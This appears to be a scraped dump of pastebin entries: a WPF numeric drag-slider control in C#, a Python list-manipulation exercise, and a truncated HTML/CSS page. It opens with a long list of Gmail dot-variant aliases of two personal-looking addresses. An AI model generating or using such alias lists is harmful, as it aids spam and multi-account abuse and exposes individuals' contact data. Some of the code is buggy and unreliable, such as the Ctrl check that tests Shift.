<a href=""mailto:phi.li.pb.en.n.e.tt.4.37@gmail.com"">phi.li.pb.en.n.e.tt.4.37@gmail.com</a>
<a href=""mailto:ph.i.l.ipbenn.e.t.t.4.37@gmail.com"">ph.i.l.ipbenn.e.t.t.4.37@gmail.com</a>
<a href=""mailto:p.h.il.ipbe.nn.e.tt.4.3.7@gmail.com"">p.h.il.ipbe.nn.e.tt.4.3.7@gmail.com</a>
<a href=""mailto:p.h.ilip.b.e.n.n.et.t4.3.7@gmail.com"">p.h.ilip.b.e.n.n.et.t4.3.7@gmail.com</a>
<a href=""mailto:ph.il.ipb.en.nett4.37@gmail.com"">ph.il.ipb.en.nett4.37@gmail.com</a>
<a href=""mailto:phi.lip.b.en.n.et.t4.37@gmail.com"">phi.lip.b.en.n.et.t4.37@gmail.com</a>
<a href=""mailto:p.hi.l.ip.b.en.net.t.437@gmail.com"">p.hi.l.ip.b.en.net.t.437@gmail.com</a>
<a href=""mailto:p.hi.l.ipb.e.n.n.ett.4.3.7@gmail.com"">p.hi.l.ipb.e.n.n.ett.4.3.7@gmail.com</a>
<a href=""mailto:p.h.ili.p.be.n.n.et.t437@gmail.com"">p.h.ili.p.be.n.n.et.t437@gmail.com</a>
<a href=""mailto:p.h.i.l.ipb.ennett.4.3.7@gmail.com"">p.h.i.l.ipb.ennett.4.3.7@gmail.com</a>
<a href=""mailto:ph.il.ipben.nett.4.37@gmail.com"">ph.il.ipben.nett.4.37@gmail.com</a>
<a href=""mailto:p.h.i.l.i.p.b.e.nne.t.t.437@gmail.com"">p.h.i.l.i.p.b.e.nne.t.t.437@gmail.com</a>
<a href=""mailto:phi.li.p.b.e.n.nett.43.7@gmail.com"">phi.li.p.b.e.n.nett.43.7@gmail.com</a>
<a href=""mailto:ph.i.l.ipbe.n.n.e.tt.4.3.7@gmail.com"">ph.i.l.ipbe.n.n.e.tt.4.3.7@gmail.com</a>
<a href=""mailto:p.h.il.i.p.b.enne.t.t437@gmail.com"">p.h.il.i.p.b.enne.t.t437@gmail.com</a>
<a href=""mailto:ph.ilipbenn.ett.4.37@gmail.com"">ph.ilipbenn.ett.4.37@gmail.com</a>
<a href=""mailto:p.h.il.i.p.b.e.n.ne.t.t.4.37@gmail.com"">p.h.il.i.p.b.e.n.ne.t.t.4.37@gmail.com</a>
<a href=""mailto:philip.b.e.nnet.t.43.7@gmail.com"">philip.b.e.nnet.t.43.7@gmail.com</a>
<a href=""mailto:phili.pb.e.nn.ett.4.37@gmail.com"">phili.pb.e.nn.ett.4.37@gmail.com</a>
<a href=""mailto:p.h.il.i.p.be.nne.t.t.43.7@gmail.com"">p.h.il.i.p.be.nne.t.t.43.7@gmail.com</a>
<a href=""mailto:ph.ili.pben.net.t4.37@gmail.com"">ph.ili.pben.net.t4.37@gmail.com</a>
<a href=""mailto:ph.i.li.p.b.e.n.n.et.t.4.3.7@gmail.com"">ph.i.li.p.b.e.n.n.et.t.4.3.7@gmail.com</a>
<a href=""mailto:p.hilip.ben.ne.tt.43.7@gmail.com"">p.hilip.ben.ne.tt.43.7@gmail.com</a>
<a href=""mailto:phil.i.p.b.en.net.t4.37@gmail.com"">phil.i.p.b.en.net.t4.37@gmail.com</a>
<a href=""mailto:phi.lip.b.en.ne.t.t.4.3.7@gmail.com"">phi.lip.b.en.ne.t.t.4.3.7@gmail.com</a>
<a href=""mailto:ph.i.lip.be.n.ne.tt.437@gmail.com"">ph.i.lip.be.n.ne.tt.437@gmail.com</a>
<a href=""mailto:ph.i.l.ip.ben.ne.t.t.4.37@gmail.com"">ph.i.l.ip.ben.ne.t.t.4.37@gmail.com</a>
<a href=""mailto:ph.il.ip.be.n.n.et.t4.37@gmail.com"">ph.il.ip.be.n.n.et.t4.37@gmail.com</a>
<a href=""mailto:ph.ili.pb.en.n.ett4.37@gmail.com"">ph.ili.pb.en.n.ett4.37@gmail.com</a>
<a href=""mailto:p.hili.p.b.enn.e.t.t437@gmail.com"">p.hili.p.b.enn.e.t.t437@gmail.com</a>
<a href=""mailto:ph.ilipb.en.net.t.4.37@gmail.com"">ph.ilipb.en.net.t.4.37@gmail.com</a>
<a href=""mailto:dhjg6406@gmail.com"">dhjg6406@gmail.com</a>
<a href=""mailto:dhj.g6.4.06@gmail.com"">dhj.g6.4.06@gmail.com</a>
<a href=""mailto:dh.jg6.40.6@gmail.com"">dh.jg6.40.6@gmail.com</a>
<a href=""mailto:d.h.j.g.64.0.6@gmail.com"">d.h.j.g.64.0.6@gmail.com</a>
<a href=""mailto:dhj.g.640.6@gmail.com"">dhj.g.640.6@gmail.com</a>
<a href=""mailto:d.h.jg64.0.6@gmail.com"">d.h.jg64.0.6@gmail.com</a>
<a href=""mailto:dh.jg.6.4.06@gmail.com"">dh.jg.6.4.06@gmail.com</a>
<a href=""mailto:d.hj.g.6.4.0.6@gmail.com"">d.hj.g.6.4.0.6@gmail.com</a>
<a href=""mailto:dhjg6.4.06@gmail.com"">dhjg6.4.06@gmail.com</a>
<a href=""mailto:dh.jg.6.4.0.6@gmail.com"">dh.jg.6.4.0.6@gmail.com</a>
<a href=""mailto:dhjg.64.0.6@gmail.com"">dhjg.64.0.6@gmail.com</a>
<a href=""mailto:d.h.j.g64.0.6@gmail.com"">d.h.j.g64.0.6@gmail.com</a>
<a href=""mailto:d.h.jg6.4.0.6@gmail.com"">d.h.jg6.4.0.6@gmail.com</a>
<a href=""mailto:d.h.jg.64.06@gmail.com"">d.h.jg.64.06@gmail.com</a>
<a href=""mailto:dh.j.g6.406@gmail.com"">dh.j.g6.406@gmail.com</a>
<a href=""mailto:d.h.j.g6.4.06@gmail.com"">d.h.j.g6.4.06@gmail.com</a>
<a href=""mailto:d.h.jg.640.6@gmail.com"">d.h.jg.640.6@gmail.com</a>
<a href=""mailto:dhjg.640.6@gmail.com"">dhjg.640.6@gmail.com</a>
<a href=""mailto:d.h.j.g.6406@gmail.com"">d.h.j.g.6406@gmail.com</a>
<a href=""mailto:dh.j.g.6.40.6@gmail.com"">dh.j.g.6.40.6@gmail.com</a>
<a href=""mailto:d.h.j.g.6.40.6@gmail.com"">d.h.j.g.6.40.6@gmail.com</a>
<a href=""mailto:dhjg6.4.0.6@gmail.com"">dhjg6.4.0.6@gmail.com</a>
<a href=""mailto:dh.jg64.0.6@gmail.com"">dh.jg64.0.6@gmail.com</a>
<a href=""mailto:dhjg6.406@gmail.com"">dhjg6.406@gmail.com</a>
<a href=""mailto:dh.jg.64.06@gmail.com"">dh.jg.64.06@gmail.com</a>
<a href=""mailto:d.hjg6.40.6@gmail.com"">d.hjg6.40.6@gmail.com</a>
<a href=""mailto:d.hj.g.64.06@gmail.com"">d.hj.g.64.06@gmail.com</a>
<a href=""mailto:dhj.g.64.0.6@gmail.com"">dhj.g.64.0.6@gmail.com</a>
<a href=""mailto:d.hj.g.640.6@gmail.com"">d.hj.g.640.6@gmail.com</a>
<a href=""mailto:d.h.jg.6.4.06@gmail.com"">d.h.jg.6.4.06@gmail.com</a>
<a href=""mailto:dhjg640.6@gmail.com"">dhjg640.6@gmail.com</a>
<a href=""mailto:dh.j.g.6.4.0.6@gmail.com"">dh.j.g.6.4.0.6@gmail.com</a>
<a href=""mailto:d.hj.g6.406@gmail.com"">d.hj.g6.406@gmail.com</a>
<a href=""mailto:d.hj.g.6.4.06@gmail.com"">d.hj.g.6.4.06@gmail.com</a>
<a href=""mailto:dh.j.g6.40.6@gmail.com"">dh.j.g6.40.6@gmail.com</a>
<a href=""mailto:d.hjg.640.6@gmail.com"">d.hjg.640.6@gmail.com</a>
<a href=""mailto:d.hj.g6.4.06@gmail.com"">d.hj.g6.4.06@gmail.com</a>
<a href=""mailto:dh.j.g.6.4.06@gmail.com"">dh.j.g.6.4.06@gmail.com</a>
<a href=""mailto:d.h.jg.6.40.6@gmail.com"">d.h.jg.6.40.6@gmail.com</a>
<a href=""mailto:dh.j.g6406@gmail.com"">dh.j.g6406@gmail.com</a>
<a href=""mailto:dhj.g.6406@gmail.com"">dhj.g.6406@gmail.com</a>
<a href=""mailto:dhj.g.6.4.06@gmail.com"">dhj.g.6.4.06@gmail.com</a>
<a href=""mailto:d.hj.g.64.0.6@gmail.com"">d.hj.g.64.0.6@gmail.com</a>
<a href=""mailto:dh.jg6.406@gmail.com"">dh.jg6.406@gmail.com</a>
<a href=""mailto:dhjg64.06@gmail.com"">dhjg64.06@gmail.com</a>
<a href=""mailto:dh.jg.640.6@gmail.com"">dh.jg.640.6@gmail.com</a>
<a href=""mailto:d.h.j.g6.40.6@gmail.com"">d.h.j.g6.40.6@gmail.com</a>
<a href=""mailto:dh.j.g.6.406@gmail.com"">dh.j.g.6.406@gmail.com</a>
<a href=""mailto:d.hjg6.406@gmail.com"">d.hjg6.406@gmail.com</a>
<a href=""mailto:d.h.j.g.6.406@gmail.com"">d.h.j.g.6.406@gmail.com</a>
<a href=""mailto:d.h.jg.64.0.6@gmail.com"">d.h.jg.64.0.6@gmail.com</a>
<a href=""mailto:d.h.jg6406@gmail.com"">d.h.jg6406@gmail.com</a>
<a href=""mailto:d.hj.g6.40.6@gmail.com"">d.hj.g6.40.6@gmail.com</a>
<a href=""mailto:dhj.g.6.40.6@gmail.com"">dhj.g.6.40.6@gmail.com</a>
<a href=""mailto:d.hjg.6.406@gmail.com"">d.hjg.6.406@gmail.com</a>
<a href=""mailto:dhjg.6.4.0.6@gmail.com"">dhjg.6.4.0.6@gmail.com</a>
<a href=""mailto:dhj.g6406@gmail.com"">dhj.g6406@gmail.com</a>
<a href=""mailto:d.h.j.g6406@gmail.com"">d.h.j.g6406@gmail.com</a>
<a href=""mailto:d.hjg.6.4.0.6@gmail.com"">d.hjg.6.4.0.6@gmail.com</a>
<a href=""mailto:d.h.jg.6.406@gmail.com"">d.h.jg.6.406@gmail.com</a>
<a href=""mailto:d.h.jg.6.4.0.6@gmail.com"">d.h.jg.6.4.0.6@gmail.com</a>
<a href=""mailto:d.h.j.g.64.06@gmail.com"">d.h.j.g.64.06@gmail.com</a>
<a href=""mailto:dhj.g6.4.0.6@gmail.com"">dhj.g6.4.0.6@gmail.com</a>
<a href=""mailto:dhj.g6.406@gmail.com"">dhj.g6.406@gmail.com</a>
<a href=""mailto:dhjg6406@gmail.com"">dhjg6406@gmail.com</a>
<a href=""mailto:d.h.jg64.06@gmail.com"">d.h.jg64.06@gmail.com</a>
<a href=""mailto:d.hjg.64.0.6@gmail.com"">d.hjg.64.0.6@gmail.com</a>
<a href=""mailto:d.hj.g6.4.0.6@gmail.com"">d.hj.g6.4.0.6@gmail.com</a>
<a href=""mailto:d.h.jg6.40.6@gmail.com"">d.h.jg6.40.6@gmail.com</a>
<a href=""mailto:dhjg.6406@gmail.com"">dhjg.6406@gmail.com</a>
<a href=""mailto:dhj.g640.6@gmail.com"">dhj.g640.6@gmail.com</a>
<a href=""mailto:d.hj.g6406@gmail.com"">d.hj.g6406@gmail.com</a>
<a href=""mailto:dh.j.g64.06@gmail.com"">dh.j.g64.06@gmail.com</a>
<a href=""mailto:d.hjg.6.40.6@gmail.com"">d.hjg.6.40.6@gmail.com</a>
<a href=""mailto:d.hjg.64.06@gmail.com"">d.hjg.64.06@gmail.com</a>
<a href=""mailto:dh.jg64.06@gmail.com"">dh.jg64.06@gmail.com</a>
<a href=""mailto:dhj.g64.0.6@gmail.com"">dhj.g64.0.6@gmail.com</a>
<a href=""mailto:d.hjg640.6@gmail.com"">d.hjg640.6@gmail.com</a>
<a href=""mailto:dh.jg.6.406@gmail.com"">dh.jg.6.406@gmail.com</a>
<a href=""mailto:dh.j.g.640.6@gmail.com"">dh.j.g.640.6@gmail.com</a>
<a href=""mailto:dh.j.g.6406@gmail.com"">dh.j.g.6406@gmail.com</a>
<a href=""mailto:d.hjg.6.4.06@gmail.com"">d.hjg.6.4.06@gmail.com</a>
<a href=""mailto:d.hj.g.6406@gmail.com"">d.hj.g.6406@gmail.com</a>
<a href=""mailto:d.hj.g64.06@gmail.com"">d.hj.g64.06@gmail.com</a>
<a href=""mailto:dh.jg640.6@gmail.com"">dh.jg640.6@gmail.com</a>
<a href=""mailto:dh.jg.6.40.6@gmail.com"">dh.jg.6.40.6@gmail.com</a>
<a href=""mailto:d.h.j.g.6.4.0.6@gmail.com"">d.h.j.g.6.4.0.6@gmail.com</a>
<a href=""mailto:dhj.g.6.4.0.6@gmail.com"">dhj.g.6.4.0.6@gmail.com</a>
<a href=""mailto:d.h.j.g6.4.0.6@gmail.com"">d.h.j.g6.4.0.6@gmail.com</a>
<a href=""mailto:d.hjg6406@gmail.com"">d.hjg6406@gmail.com</a>
<a href=""mailto:d.h.j.g640.6@gmail.com"">d.h.j.g640.6@gmail.com</a>
<a href=""mailto:d.h.jg640.6@gmail.com"">d.h.jg640.6@gmail.com</a>
<a href=""mailto:dhjg64.0.6@gmail.com"">dhjg64.0.6@gmail.com</a>
<a href=""mailto:d.h.jg6.4.06@gmail.com"">d.h.jg6.4.06@gmail.com</a>
<a href=""mailto:dh.j.g.64.0.6@gmail.com"">dh.j.g.64.0.6@gmail.com</a>
<a href=""mailto:dhj.g.6.406@gmail.com"">dhj.g.6.406@gmail.com</a>
<a href=""mailto:dh.jg6.4.0.6@gmail.com"">dh.jg6.4.0.6@gmail.com</a>
<a href=""mailto:dh.j.g6.4.0.6@gmail.com"">dh.j.g6.4.0.6@gmail.com</a>
<a href=""mailto:dh.j.g6.4.06@gmail.com"">dh.j.g6.4.06@gmail.com</a>
<a href=""mailto:d.hjg64.0.6@gmail.com"">d.hjg64.0.6@gmail.com</a>
<a href=""mailto:d.h.j.g.6.4.06@gmail.com"">d.h.j.g.6.4.06@gmail.com</a>
<a href=""mailto:d.hj.g.6.40.6@gmail.com"">d.hj.g.6.40.6@gmail.com</a>
<a href=""mailto:dh.j.g.64.06@gmail.com"">dh.j.g.64.06@gmail.com</a>
<a href=""mailto:dhj.g6.40.6@gmail.com"">dhj.g6.40.6@gmail.com</a>
<a href=""mailto:dh.jg6.4.06@gmail.com"">dh.jg6.4.06@gmail.com</a>
<a href=""mailto:d.hjg64.06@gmail.com"">d.hjg64.06@gmail.com</a>
<a href=""mailto:dhj.g64.06@gmail.com"">dhj.g64.06@gmail.com</a>
<a href=""mailto:d.hj.g64.0.6@gmail.com"">d.hj.g64.0.6@gmail.com</a>
<a href=""mailto:dh.jg.6406@gmail.com"">dh.jg.6406@gmail.com</a>
<a href=""mailto:dhjg6.40.6@gmail.com"">dhjg6.40.6@gmail.com</a>
<a href=""mailto:d.hj.g640.6@gmail.com"">d.hj.g640.6@gmail.com</a>
<a href=""mailto:dhjg.6.406@gmail.com"">dhjg.6.406@gmail.com</a>
<a href=""mailto:d.h.j.g6.406@gmail.com"">d.h.j.g6.406@gmail.com</a>
<a href=""mailto:dh.jg.64.0.6@gmail.com"">dh.jg.64.0.6@gmail.com</a>
<a href=""mailto:dhjg.64.06@gmail.com"">dhjg.64.06@gmail.com</a>
<a href=""mailto:dhjg.6.4.06@gmail.com"">dhjg.6.4.06@gmail.com</a>
<a href=""mailto:d.hjg6.4.0.6@gmail.com"">d.hjg6.4.0.6@gmail.com</a>
<a href=""mailto:dh.j.g64.0.6@gmail.com"">dh.j.g64.0.6@gmail.com</a>
<a href=""mailto:d.hjg.6406@gmail.com"">d.hjg.6406@gmail.com</a>
<a href=""mailto:d.hjg6.4.06@gmail.com"">d.hjg6.4.06@gmail.com</a>
<a href=""mailto:d.h.jg.6406@gmail.com"">d.h.jg.6406@gmail.com</a>
<a href=""mailto:dhjg.6.40.6@gmail.com"">dhjg.6.40.6@gmail.com</a>
<a href=""mailto:dhj.g.64.06@gmail.com"">dhj.g.64.06@gmail.com</a>
<a href=""mailto:dh.jg6406@gmail.com"">dh.jg6406@gmail.com</a>
<a href=""mailto:d.hj.g.6.406@gmail.com"">d.hj.g.6.406@gmail.com</a>
<a href=""mailto:d.h.j.g64.06@gmail.com"">d.h.j.g64.06@gmail.com</a>
<a href=""mailto:d.h.jg6.406@gmail.com"">d.h.jg6.406@gmail.com</a>
<a href=""mailto:d.h.j.g.640.6@gmail.com"">d.h.j.g.640.6@gmail.com</a>
<a href=""mailto:dh.j.g640.6@gmail.com"">dh.j.g640.6@gmail.com</a>
"
DdZkpwyX,"Adobe ""numeric text slider"" for WPF",bobmarley12345,C#,Sunday 28th of May 2023 01:39:04 PM CDT,"using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Threading;
using FrameControlEx.Core.Utils;

namespace FrameControlEx.Controls {
    [TemplatePart(Name = ""PART_TextBlock"", Type = typeof(TextBlock))]
    [TemplatePart(Name = ""PART_TextBox"", Type = typeof(TextBox))]
    public class NumberDragger : RangeBase {
        public static readonly DependencyProperty VerySmallChangeProperty =
            DependencyProperty.Register(
                ""VerySmallChange"",
                typeof(double),
                typeof(NumberDragger),
                new PropertyMetadata(0.01d));

        public static readonly DependencyProperty NormalChangeProperty =
            DependencyProperty.Register(
                ""NormalChange"",
                typeof(double),
                typeof(NumberDragger),
                new PropertyMetadata(1d));

        protected static readonly DependencyPropertyKey IsDraggingPropertyKey =
            DependencyProperty.RegisterReadOnly(
                ""IsDragging"",
                typeof(bool),
                typeof(NumberDragger),
                new PropertyMetadata(BoolBox.False,
                    (d, e) => ((NumberDragger) d).OnIsDraggingChanged((bool) e.OldValue, (bool) e.NewValue)));

        public static readonly DependencyProperty IsDraggingProperty = IsDraggingPropertyKey.DependencyProperty;

        public static readonly DependencyProperty OrientationProperty =
            DependencyProperty.Register(
                ""Orientation"",
                typeof(Orientation),
                typeof(NumberDragger),
                new PropertyMetadata(Orientation.Horizontal,
                    (d, e) => ((NumberDragger) d).OnOrientationChanged((Orientation) e.OldValue, (Orientation) e.NewValue)));

        public static readonly DependencyPropertyKey IsEditingTextBoxPropertyKey =
            DependencyProperty.RegisterReadOnly(
                ""IsEditingTextBox"",
                typeof(bool),
                typeof(NumberDragger),
                new PropertyMetadata(BoolBox.False,
                    (d, e) => ((NumberDragger) d).OnIsEditingTextBoxChanged((bool) e.OldValue, (bool) e.NewValue),
                    (d, v) => ((NumberDragger) d).OnCoerceIsEditingTextBox((bool) v)));

        public static readonly DependencyProperty IsEditingTextBoxProperty = IsEditingTextBoxPropertyKey.DependencyProperty;

        public static readonly DependencyProperty RoundedPlacesProperty =
            DependencyProperty.Register(
                ""RoundedPlaces"",
                typeof(int),
                typeof(NumberDragger),
                new PropertyMetadata(4,
                    (d, e) => ((NumberDragger) d).OnRoundedPlacesChanged((int) e.OldValue, (int) e.NewValue)));

        public static readonly DependencyProperty LockCursorWhileDraggingProperty =
            DependencyProperty.Register(
                ""LockCursorWhileDragging"",
                typeof(bool),
                typeof(NumberDragger),
                new PropertyMetadata(BoolBox.False, (d, e) => throw new NotImplementedException(""Locking the mouse cursor is currently unsupported"")));

        private TextBlock PART_TextBlock;
        private TextBox PART_TextBox;
        private Point? lastClickPoint;
        private Point? lastMouseMove;
        private double? previousValue;
        private bool ignoreMouseMove;

        public double VerySmallChange {
            get => (double) this.GetValue(VerySmallChangeProperty);
            set => this.SetValue(VerySmallChangeProperty, value);
        }

        /// <summary>
        /// The amount to add per pixel of change while dragging
        /// </summary>
        public double NormalChange {
            get => (double) this.GetValue(NormalChangeProperty);
            set => this.SetValue(NormalChangeProperty, value);
        }

        public bool IsDragging {
            get => (bool) this.GetValue(IsDraggingProperty);
            protected set => this.SetValue(IsDraggingPropertyKey, value.Box());
        }

        public Orientation Orientation {
            get => (Orientation) this.GetValue(OrientationProperty);
            set => this.SetValue(OrientationProperty, value);
        }

        public bool IsEditingTextBox {
            get => (bool) this.GetValue(IsEditingTextBoxProperty);
            protected set => this.SetValue(IsEditingTextBoxPropertyKey, value.Box());
        }

        public int RoundedPlaces {
            get => (int) this.GetValue(RoundedPlacesProperty);
            set => this.SetValue(RoundedPlacesProperty, value);
        }

        private bool isUpdatingExternalMouse;

        public bool LockCursorWhileDragging {
            get => (bool) this.GetValue(LockCursorWhileDraggingProperty);
            set => this.SetValue(LockCursorWhileDraggingProperty, value.Box());
        }

        public double RoundedValue => this.GetRoundedValue(this.Value);

        public NumberDragger() {
            this.SmallChange = 0.1d;
            this.LargeChange = 2.5d;
            this.Loaded += (s, e) => {
                this.CoerceValue(IsEditingTextBoxProperty);
                this.UpdateText();
            };
        }

        public double GetRoundedValue(double value) {
            return Math.Round(value, this.RoundedPlaces);
        }

        protected virtual void OnIsDraggingChanged(bool oldValue, bool newValue) {

        }

        protected virtual void OnOrientationChanged(Orientation oldValue, Orientation newValue) {
            if (this.IsDragging) {
                this.CancelDrag();
            }

            this.IsEditingTextBox = false;
        }

        protected virtual void OnIsEditingTextBoxChanged(bool oldValue, bool newValue) {
            if (newValue && this.IsDragging) {
                this.CancelDrag();
            }

            this.UpdateText();
            if (oldValue != newValue) {
                this.PART_TextBox.Focus();
                this.PART_TextBox.SelectAll();
            }
        }

        private bool OnCoerceIsEditingTextBox(bool isEditing) {
            if (this.PART_TextBox == null || this.PART_TextBlock == null) {
                return isEditing;
            }

            if (isEditing) {
                this.PART_TextBox.Visibility = Visibility.Visible;
                this.PART_TextBlock.Visibility = Visibility.Hidden;
            }
            else {
                this.PART_TextBox.Visibility = Visibility.Hidden;
                this.PART_TextBlock.Visibility = Visibility.Visible;
            }

            this.UpdateCursor();
            return isEditing;
        }

        public void UpdateCursor() {
            Cursor cursor;
            switch (this.Orientation) {
                case Orientation.Horizontal:
                    cursor = Cursors.SizeWE;
                    break;
                case Orientation.Vertical:
                    cursor = Cursors.SizeNS;
                    break;
                default:
                    cursor = Cursors.Arrow;
                    break;
            }

            if (this.IsDragging || this.IsMouseOver) {
                this.Cursor = cursor;
                this.PART_TextBlock.ClearValue(CursorProperty);
            }
            else {
                this.ClearValue(CursorProperty);
                if (this.IsEditingTextBox) {
                    this.PART_TextBlock.ClearValue(CursorProperty);
                }
                else {
                    this.PART_TextBlock.Cursor = cursor;
                }
            }
        }

        protected virtual void OnRoundedPlacesChanged(int? oldValue, int? newValue) {
            if (newValue != null) {
                this.UpdateText();
            }
        }

        protected override void OnValueChanged(double oldValue, double newValue) {
            base.OnValueChanged(oldValue, newValue);
            this.UpdateText();
        }

        protected void UpdateText() {
            string text = this.RoundedValue.ToString();
            if (this.IsEditingTextBox) {
                if (this.PART_TextBox == null)
                    return;
                this.PART_TextBox.Text = text;
            }
            else {
                if (this.PART_TextBlock == null)
                    return;
                this.PART_TextBlock.Text = text;
            }
        }

        public override void OnApplyTemplate() {
            base.OnApplyTemplate();
            this.PART_TextBlock = this.GetTemplateChild(""PART_TextBlock"") as TextBlock ?? throw new Exception(""Missing template part: "" + nameof(this.PART_TextBlock));
            this.PART_TextBox = this.GetTemplateChild(""PART_TextBox"") as TextBox ?? throw new Exception(""Missing template part: "" + nameof(this.PART_TextBox));
            this.PART_TextBox.Focusable = true;
            this.PART_TextBox.KeyDown += this.OnTextBoxKeyDown;
            this.PART_TextBox.GotFocus += (s, e) => {
                if (this.PART_TextBox.IsFocused || this.PART_TextBox.IsMouseCaptured) {
                    this.IsEditingTextBox = true;
                }
            };

            this.PART_TextBox.LostFocus += (s, e) => {
                this.IsEditingTextBox = false;
            };

            this.CoerceValue(IsEditingTextBoxProperty);
        }

        protected override void OnMouseLeftButtonDown(MouseButtonEventArgs e) {
            if (!this.IsDragging) {
                e.Handled = true;
                this.Focus();

                this.ignoreMouseMove = true;
                try {
                    this.CaptureMouse();
                    Debug.WriteLine(""Mouse Captured"");
                }
                finally {
                    this.ignoreMouseMove = false;
                }

                this.lastMouseMove = this.lastClickPoint = e.GetPosition(this);
                this.UpdateCursor();
            }

            base.OnMouseLeftButtonDown(e);
        }

        protected override void OnMouseLeftButtonUp(MouseButtonEventArgs e) {
            e.Handled = true;
            if (this.IsDragging) {
                this.CompleteDrag();
            }
            else if (this.IsMouseOver) {
                if (this.IsMouseCaptured) {
                    this.ReleaseMouseCapture();
                    Debug.WriteLine(""Mouse Capture Released"");
                }

                this.IsEditingTextBox = true;
                this.UpdateCursor();
            }

            base.OnMouseLeftButtonUp(e);
        }

        protected override void OnMouseMove(MouseEventArgs e) {
            base.OnMouseMove(e);
            if (this.ignoreMouseMove || this.isUpdatingExternalMouse) {
                return;
            }

            if (this.IsEditingTextBox) {
                if (this.IsDragging) {
                    Debug.WriteLine(""IsDragging and IsEditingTextBox were both true"");
                    this.previousValue = null;
                    this.CancelDrag();
                }

                return;
            }

            if (e.LeftButton != MouseButtonState.Pressed) {
                if (this.IsDragging) {
                    this.CompleteDrag();
                }

                return;
            }

            if (Keyboard.IsKeyDown(Key.Escape) && this.IsDragging) {
                this.CancelDrag();
                return;
            }

            Point mouse = e.GetPosition(this);
            if (this.lastClickPoint is Point lastClick && !this.IsDragging) {
                if (Math.Abs(mouse.X - lastClick.X) < 5d && Math.Abs(mouse.Y - lastClick.Y) < 5d) {
                    return;
                }

                this.BeginMouseDrag();
            }

            if (!this.IsDragging) {
                return;
            }

            if (this.IsEditingTextBox) {
                Debug.WriteLine(""IsEditingTextBox and IsDragging were both true"");
                this.IsEditingTextBox = false;
            }

            if (!(this.lastMouseMove is Point lastMouse)) {
                return;
            }

            double change;
            switch (this.Orientation) {
                case Orientation.Horizontal: {
                    change = mouse.X - lastMouse.X;
                    break;
                }
                case Orientation.Vertical: {
                    change = mouse.Y - lastMouse.Y;
                    break;
                }
                default: {
                    throw new Exception(""Invalid orientation: "" + this.Orientation);
                }
            }

            bool isShiftDown = (Keyboard.Modifiers & ModifierKeys.Shift) != 0;
            bool isCtrlDown = (Keyboard.Modifiers & ModifierKeys.Shift) != 0;

            if (isShiftDown) {
                if (isCtrlDown) {
                    change *= this.VerySmallChange;
                }
                else {
                    change *= this.SmallChange;
                }
            }
            else if (isCtrlDown) {
                change *= this.LargeChange;
            }
            else {
                change *= this.NormalChange;
            }

            double roundedValue = Maths.Clamp(this.GetRoundedValue(this.Value + change), this.Minimum, this.Maximum);
            if (Maths.Equals(this.RoundedValue, roundedValue)) {
                return;
            }

            this.Value = roundedValue;
            this.lastMouseMove = mouse;
        }

        protected override void OnKeyDown(KeyEventArgs e) {
            base.OnKeyDown(e);
            if (!this.IsDragging || e.Key != Key.Escape) {
                return;
            }

            e.Handled = true;
            this.CancelInputEdit();
            if (this.IsDragging) {
                this.CancelDrag();
            }

            this.IsEditingTextBox = false;
        }

        private void OnTextBoxKeyDown(object sender, KeyEventArgs e) {
            if (!this.IsDragging && this.IsEditingTextBox) {
                if (e.Key != Key.Enter && e.Key != Key.Escape) {
                    return;
                }

                if (e.Key == Key.Enter && double.TryParse(this.PART_TextBox.Text, out double value)) {
                    this.CompleteInputEdit(value);
                }
                else {
                    this.CancelInputEdit();
                }
            }
        }

        protected override void OnLostFocus(RoutedEventArgs e) {
            base.OnLostFocus(e);
            if (this.IsDragging) {
                this.CancelDrag();
            }

            this.IsEditingTextBox = false;
        }

        public void CompleteInputEdit(double value) {
            this.IsEditingTextBox = false;
            this.Value = value;
            this.UpdateCursor();
        }

        public void CancelInputEdit() {
            this.IsEditingTextBox = false;
            this.UpdateText();
            this.UpdateCursor();
        }

        public void BeginMouseDrag() {
            this.IsEditingTextBox = false;
            this.previousValue = this.Value;
            this.Focus();
            this.CaptureMouse();
            Debug.WriteLine(""[BeginMouseDrag] Mouse Captured"");
            this.IsDragging = true;
            this.UpdateCursor();
        }

        public void CompleteDrag() {
            this.CleanUpDrag();
            this.previousValue = null;
        }

        public void CancelDrag() {
            this.CleanUpDrag();
            if (this.previousValue is double oldVal) {
                this.previousValue = null;
                this.Value = oldVal;
            }
        }

        protected void CleanUpDrag() {
            if (!this.IsDragging)
                return;
            if (this.IsMouseCaptured)
                this.ReleaseMouseCapture();
            this.ClearValue(IsDraggingPropertyKey);

            this.lastMouseMove = null;
            this.lastClickPoint = null;

            this.UpdateCursor();
        }
    }

    // internal static class MouseUtils {
    //     [DllImport(""user32.dll"")]
    //     public static extern bool SetCursorPos(int x, int y);
    // 
    //     public static void SetCursorPos(Point position) {
    //         SetCursorPos((int) position.X, (int) position.Y);
    //     }
    // }
}"
U6V1WMwr,easter_gifts,dgodinov,Python,Sunday 28th of May 2023 01:24:21 PM CDT,"gifts_to_buy = input().split()

command = []

while True:
    command = input()
    if command == ""No Money"":
        break
    splitted_command = command.split()
    if splitted_command[0] == ""OutOfStock"":
        for i in range(len(gifts_to_buy)):
            if gifts_to_buy[i] == splitted_command[1]:
                gifts_to_buy[i] = ""None""
    elif splitted_command[0] == ""Required"":
        index_number = []
        gift_to_change = []
        index_number.append(splitted_command[2])
        gift_to_change.append(splitted_command[1])
        digit_index = [int(x) for x in index_number]
        for digit_index in range(len(digit_index) + 1, len(splitted_command)):
            gifts_to_buy[digit_index] = """".join(gift_to_change)
    elif splitted_command[0] == ""JustInCase"":
        gifts_to_buy.pop(-1)
        gifts_to_buy.append(splitted_command[1])

while ""None"" in gifts_to_buy:
    gifts_to_buy.remove(""None"")
print("" "".join(gifts_to_buy))
"
3McgqzQk,diagonals,marshallsmyth,CSS,Sunday 28th of May 2023 01:03:28 PM CDT,"<!DOCTYPE html>   <html>   <head>   <meta name=""viewport"" content=""width=device-width, initial-scale=1""><title>Graph Paper   
 </title><style>@import url(https://fonts.googleapis.com/css?family=Macondo);  ::-webkit-scrollbar { width:16px;height:16px; } 
  ::-webkit-scrollbar-track {background:#006; } ::-webkit-scrollbar-thumb { border-radius:22px;background:#600; } 
 body { background:#fed;overflow:auto; }     
 .maintext { text-align:center;font-family:macondo;font-size:22px;color:#f0a;line-height:11px; }       
